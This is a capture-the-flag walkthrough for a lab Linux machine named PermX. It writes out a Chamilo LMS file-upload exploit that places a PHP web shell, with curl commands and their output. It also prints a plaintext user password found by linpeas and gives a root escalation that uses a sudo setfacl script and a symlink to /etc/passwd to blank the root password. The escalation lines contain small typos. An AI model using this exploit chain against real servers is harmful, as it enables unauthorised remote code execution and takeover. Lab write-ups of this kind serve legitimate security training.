## PermX machine : Linux 

- [+] : Target IP 
   >>	10.10.11.23
   
## Recon 

- [+] : Port 22,80 open 
   >>	Port 80 has lms subdomain .
   >>	chamilo 1.11(/Documentation)
   
## Foothold  

- [+] : CVE -> https://starlabs.sg/advisories/23/23-4220/

		```bash
		echo '<?php system("id"); ?>' > rce.php
		curl -F 'bigUploadFile=@rce.php' 'http://<chamilo>/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
		The file has successfully been uploaded.
		curl 'http://<chamilo>/main/inc/lib/javascript/bigupload/files/rce.php'
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
		```


## www-data 

- [+] : Linpeas.sh shows password of mtz 
   >>	mtz:03F6lY3uXAP2bkW8

## Mtz 

- [+] : sudo -l ->  /opt/acl.sh
  >>	which is a script that uses setfacl but only in /home/mtz/*
  >>	create semilink ls -s /etc/passwd link1
  >>	sudo /opt/acl.sh mtz rw link1 
  >>	nano link1 and delete root password 
  >> 	su root .
  
### Personal notes for privesc 

- [-] : Chattr 
  >>	Chattr is a way for linux to make a file immtuable 
  >>	immutable = never change (thats why we cant delete flags for instance)
  >>	root.txt nor /root can be linked to something since a byte will increment for the links section in root.txt
